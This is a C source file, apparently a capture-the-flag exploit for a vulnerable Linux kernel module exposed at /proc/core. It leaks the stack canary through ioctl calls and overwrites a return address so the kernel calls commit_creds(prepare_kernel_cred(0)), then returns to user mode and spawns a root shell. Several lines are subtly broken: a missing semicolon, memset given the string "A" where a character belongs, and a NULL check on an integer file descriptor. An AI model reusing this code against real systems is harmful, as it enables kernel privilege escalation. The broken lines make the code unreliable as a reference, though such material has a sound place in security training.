#include <stdio.h>
#include <stdlib.h>  
#include <fcntl.h>   
#include <unistd.h>  
#include <string.h>  
#include <stdint.h>  
#include <errno.h>   

#define CORE_READ 0x6677889B
#define CORE_OFFSET 0x6677889C
#define CORE_COPY 0x6677889A

void *(*prepare_kernel_cred)(void *);
int (*commit_creds)(void *);

struct trap_frame {
    void *user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    void *user_rsp;
    uint64_t user_ss;
} __attribute__((packed));
struct trap_frame tf;

void get_shell(void) {
    system("/bin/sh");
}

void backup_tf(void) {
    asm("mov tf+8, cs;"
        "pushf; pop tf+16;"
        "mov tf+24, rsp;"
        "mov tf+32, ss;"
       );
    tf.user_rip = &get_shell;
}

void payload(void) {
    commit_creds(prepare_kernel_cred(0));
    asm("swapgs;"
        "mov %%rsp, %0;"
        "iretq;"
        : : "r" (&tf));
}

void *get_kallsyms(char *name)
{
    FILE *fp;
    void *addr;
    char sym[512];

    fp = fopen("/tmp/kallsyms", "r");
    
    while (fscanf(fp, "%p %*c %512s\n", &addr, sym) > 0) 
    {
        if(strcmp(sym, name) == 0) break;
        else addr = NULL;
    }

    fclose(fp);
    return addr;
}

int main(void)
{
    //
    int fd = open("/proc/core",O_RDWR);

    if(fd == NULL)
    {
    printf("[-] Open /proc/core error!\n");
    exit(1);
    }
    printf("[+] Open /proc/core!\n");

    //
    prepare_kernel_cred = get_kallsyms("prepare_kernel_cred");
    commit_creds = get_kallsyms("commit_creds");

    printf("[+] prepare_kernel_cred : 0x%lx\n", prepare_kernel_cred);
    printf("[+] commit_creds : 0x%lx\n", commit_creds);

    //
    char buf[0x100];
    char canary[0x8];

    ioctl(fd, CORE_OFFSET, 0x40);
    ioctl(fd, CORE_READ, buf);
    
    memcpy(canary, buf, 0x8);

    printf("[+] canary : ");
    for(int i = 0;i < 8;i++)
    {
        printf("%02x ",canary[i] & 0xff);
    }
    printf("\n");

    //
    char rop[0x100];

    memset(rop, "A", 0x40);
    memcpy(rop+0x40, canary, 8);
    memset(rop+0x48, "A", 8);
    *(void**)(rop+0x50) = &payload
    memset(rop+0x58, "A", 8);
    backup_tf();

    write(fd, rop, 0x58);
    ioctl(fd, CORE_COPY, 0xffffffffffff0000 | sizeof(rop));

    return 0;
}